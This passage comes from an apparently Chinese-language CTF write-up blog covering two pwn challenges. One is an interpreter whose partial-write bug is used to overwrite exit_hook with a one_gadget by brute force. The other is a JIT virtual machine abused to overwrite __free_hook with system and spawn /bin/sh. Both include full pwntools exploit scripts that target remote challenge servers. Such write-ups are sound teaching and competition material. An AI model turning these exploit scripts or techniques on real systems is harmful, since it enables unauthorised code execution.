class="number">2</span>d000  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731bc000</span>     <span class="number">0x7f2a731bd000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      [anon_7f2a731bc]</span><br><span class="line">    <span class="number">0x7ffed494a000</span>     <span class="number">0x7ffed496b000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7ffed49f3000</span>     <span class="number">0x7ffed49f7000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffed49f7000</span>     <span class="number">0x7ffed49f9000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>局部写漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( c.key == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *data = code[c.index + <span class="number">1</span>];</span><br><span class="line">  c.index += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>申请一片大空间，使得 malloc 调用 mmap：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(sizea);</span><br></pre></td></tr></table></figure>
<p>计算偏移使得 data 指向 exit_hook</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( c.key == <span class="string">&#x27;@&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  data += *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;code[c.index + <span class="number">1</span>];</span><br><span class="line">  c.index += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用局部写漏洞覆盖 exit_hook 低位为 one_gadget，爆破3位出 flag（概率为 1/4096）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./main1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">local = 0</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">    p = process(challenge)</span></span><br><span class="line"><span class="string">    #p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    p = remote(&#x27;1.13.101.243&#x27;,&#x27;25752&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x12DA)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    backdoor_addr = <span class="number">0x1209</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    sla(<span class="string">&quot;data size&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100000</span>))</span><br><span class="line">    sla(<span class="string">&quot;code size&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>)) <span class="comment"># 0x7ffff7eb8afe</span></span><br><span class="line">    payload = <span class="string">&quot;@&quot;</span>+p32(<span class="number">0x323f58</span>)+<span class="string">&quot;.&quot;</span>+p8(<span class="number">0xfe</span>)+<span class="string">&quot;&gt;.&quot;</span>+p8(<span class="number">0x7a</span>)+<span class="string">&quot;&gt;.&quot;</span>+p8(<span class="number">0xa6</span>)+<span class="string">&quot;q&quot;</span></span><br><span class="line">    sla(<span class="string">&quot;your code&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        p = remote(<span class="string">&#x27;1.13.101.243&#x27;</span>,<span class="string">&#x27;25752&#x27;</span>)</span><br><span class="line">        <span class="comment">#p = process(challenge)</span></span><br><span class="line">        pwn()</span><br><span class="line">        sl(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">        flag = ru(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jit"><a href="#jit" class="headerlink" title="jit"></a>jit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jit: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">7062b</span>1b0edff968d09e012e0905c2e5b7276cbd4, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped       </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>程序分析</strong></p>
<p>本题目实现了一个虚拟机，在地址为 0x4240 的地方开始加载字节码 ，支持4种内置的函数调用，大致格式如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[opcode][原寄存器的值][目标寄存器的值][data len][data]</span><br><span class="line">[<span class="number">0</span>---<span class="number">-7</span>][<span class="number">8</span>-------<span class="number">-11</span>][<span class="number">12</span>--------<span class="number">-15</span>][<span class="number">16</span>---<span class="number">-31</span>][<span class="number">32</span><span class="number">-63</span>]</span><br></pre></td></tr></table></figure>
<p>程序在 0x31B0 的代码会对之前部署的字节码进行解析，并将其转化为 x86 能理解的二进制代码并写入一片由 mmap 申请的内存空间</p>
<p>下面就是 mov 指令的实现：（包括直接寻址和间接寻址）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xB7</span>:</span><br><span class="line">  ++reg_pc;</span><br><span class="line">  *(&amp;reg + (<span class="keyword">unsigned</span> __int8)reg_op1) = val;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xBF</span>:</span><br><span class="line">  ++reg_pc;</span><br><span class="line">  *(&amp;reg + (<span class="keyword">unsigned</span> __int8)reg_op1) = *(&amp;reg + (<span class="keyword">unsigned</span> __int8)reg_op2);</span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>
<p>经过调试测试，各个寄存器对应的数值如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>reg</th>
<th>num</th>
</tr>
</thead>
<tbody>
<tr>
<td>rax</td>
<td>0</td>
</tr>
<tr>
<td>rdi</td>
<td>1</td>
</tr>
<tr>
<td>rsi</td>
<td>2</td>
</tr>
<tr>
<td>rdx</td>
<td>3</td>
</tr>
<tr>
<td>r9</td>
<td>4</td>
</tr>
<tr>
<td>r8</td>
<td>5</td>
</tr>
<tr>
<td>rbx</td>
<td>6</td>
</tr>
<tr>
<td>r13</td>
<td>7</td>
</tr>
<tr>
<td>r14</td>
<td>8</td>
</tr>
<tr>
<td>r15</td>
<td>9</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>PS：使用 opcode 决定该寄存器的占位大小（byte，word，dword，qword）</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>本题目完全是依靠程序本身的功能进行入侵</p>
<p>可以构建合适的汇编代码来获取 <code>[rdi+0x58]</code> 处的 libc 地址，计算偏移将其改为 system</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">opcode,reg_op2,reg_op1,data1,data2</span>):</span></span><br><span class="line">    payload =  p8(opcode)</span><br><span class="line">    payload += p8((reg_op2&lt;&lt;<span class="number">4</span>) | reg_op1)</span><br><span class="line">    payload += p16(data1)</span><br><span class="line">    payload += p32(data2)</span><br><span class="line">    payload = binascii.hexlify(payload.encode())</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_reg</span>(<span class="params">reg_op1,reg_op2,offset</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x79</span>,reg_op2,reg_op1,offset,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_data</span>(<span class="params">reg_op1,data</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x17</span>,<span class="number">0</span>,reg_op1,<span class="number">0</span>,data)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span>(<span class="params">key</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x85</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,key)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  load_reg(regs().r15, regs().rdi, <span class="number">0x58</span>)</span><br><span class="line">payload += sub_data(regs().r15, <span class="number">0x4346e0</span>-<span class="number">0x80</span>) </span><br><span class="line">payload += add_data(regs().r15, <span class="number">0x52290</span>-<span class="number">0x80</span>) </span><br></pre></td></tr></table></figure>
<p>经调试发现，程序的“内置函数”就记录在 heap 中</p>
<p>比赛时的入侵思路就是往“内置函数”中写入 system（程序通过 offset 来决定具体调用哪个“内置函数”，但并没有对 offset 进行限制）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│  <span class="number">0x55e26ce6ba58</span> ◂— <span class="number">0x211</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│  <span class="number">0x55e26ce6ba60</span> —▸ <span class="number">0x55e26c5ca710</span> ◂— endbr64 </span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│  <span class="number">0x55e26ce6ba68</span> —▸ <span class="number">0x55e26c5ca750</span> ◂— endbr64 </span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│  <span class="number">0x55e26ce6ba70</span> —▸ <span class="number">0x55e26c5ca770</span> ◂— endbr64 </span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│  <span class="number">0x55e26ce6ba78</span> —▸ <span class="number">0x55e26c5ca7b0</span> ◂— endbr64 </span><br><span class="line"><span class="number">30</span>:<span class="number">0180</span>│  <span class="number">0x55e26ce6ba80</span> —▸ <span class="number">0x55e26c5ca790</span> ◂— endbr64 </span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>│  <span class="number">0x55e26ce6ba88</span> —▸ <span class="number">0x55e26c5ca780</span> ◂— endbr64 </span><br></pre></td></tr></table></figure>
<p>最后发现写入的 system 不起作用，不管是添加到 func_list 后还是覆盖已有的值都没用</p>
<p>可能是 func_list 的位置没有找对，因为在 search 时发现多个地址都存在 func_list：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0x55c891fd0710</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>\x10\x07\xfd\x91\xc8U\x00\x00<span class="number">&#x27;</span></span><br><span class="line">[heap]          <span class="number">0x55c892d062d8</span> <span class="number">0x55c891fd0710</span></span><br><span class="line">[heap]          <span class="number">0x55c892d07b00</span> <span class="number">0x55c891fd0710</span></span><br><span class="line">[heap]          <span class="number">0x55c892d07f50</span> <span class="number">0x55c891fd0710</span></span><br><span class="line">[anon_7fc3e8f18] <span class="number">0x7fc3e8f18030</span> adc    byte ptr [rdi], al</span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fff31949158</span> <span class="number">0x55c891fd0710</span></span><br></pre></td></tr></table></figure>
<p>可以选择去挨个覆盖这些地址，也可以直接去覆盖 free_hook，这里采用了后者</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./jit1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x886B)\nb *$rebase(0x85F5)\nb *$rebase(0x4476)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">regs</span>():</span></span><br><span class="line">    rax = <span class="number">0</span></span><br><span class="line">    rdi = <span class="number">1</span></span><br><span class="line">    rsi = <span class="number">2</span></span><br><span class="line">    rdx = <span class="number">3</span></span><br><span class="line">    r9  = <span class="number">4</span></span><br><span class="line">    r8  = <span class="number">5</span></span><br><span class="line">    rbx = <span class="number">6</span></span><br><span class="line">    r13 = <span class="number">7</span></span><br><span class="line">    r14 = <span class="number">8</span></span><br><span class="line">    r15 = <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">opcode,reg_op2,reg_op1,data1,data2</span>):</span></span><br><span class="line">    payload =  p8(opcode)</span><br><span class="line">    payload += p8((reg_op2&lt;&lt;<span class="number">4</span>) | reg_op1)</span><br><span class="line">    payload += p16(data1)</span><br><span class="line">    payload += p32(data2)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    payload = binascii.hexlify(payload.encode())</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store_reg</span>(<span class="params">reg_op1,reg_op2,offset</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x7b</span>,reg_op2,reg_op1,offset,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store_data</span>(<span class="params">reg_op1,data,offset</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x7a</span>,<span class="number">0</span>,reg_op1,offset,data)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_reg</span>(<span class="params">reg_op1,reg_op2,offset</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x79</span>,reg_op2,reg_op1,offset,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov_reg</span>(<span class="params">reg_op1,reg_op2</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0xbf</span>,reg_op2,reg_op1,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov_data</span>(<span class="params">reg_op1,data</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0xb7</span>,<span class="number">0</span>,reg_op1,<span class="number">0</span>,data)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_data</span>(<span class="params">reg_op1,data</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x7</span>,<span class="number">0</span>,reg_op1,<span class="number">0</span>,data)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_data</span>(<span class="params">reg_op1,data</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x17</span>,<span class="number">0</span>,reg_op1,<span class="number">0</span>,data)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span>():</span></span><br><span class="line">    <span class="comment">#payload = cmd(0x85,0,0,0,key)</span></span><br><span class="line">    payload = <span class="string">&quot;8500050000000000&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  load_reg(regs().r9, regs().rdi, <span class="number">0x38</span>)</span><br><span class="line">payload += sub_data(regs().r9, <span class="number">0x4346e0</span>-<span class="number">0x80</span>) </span><br><span class="line">payload += add_data(regs().r9, <span class="number">0x52290</span>-<span class="number">0x80</span>) </span><br><span class="line">payload += load_reg(regs().r8, regs().rdi, <span class="number">0x48</span>)</span><br><span class="line">payload += sub_data(regs().r8, <span class="number">0x41f060</span>-<span class="number">0xe048</span>) </span><br><span class="line">payload += add_data(regs().r8, <span class="number">0x1eee48</span>-<span class="number">0xe048</span>) </span><br><span class="line">payload += store_reg(regs().r8,regs().r9,<span class="number">0</span>)</span><br><span class="line">payload += store_data(regs().rdi,<span class="number">0x6873</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Program:&quot;</span>,payload)</span><br><span class="line">sla(<span class="string">&quot;Memory:&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
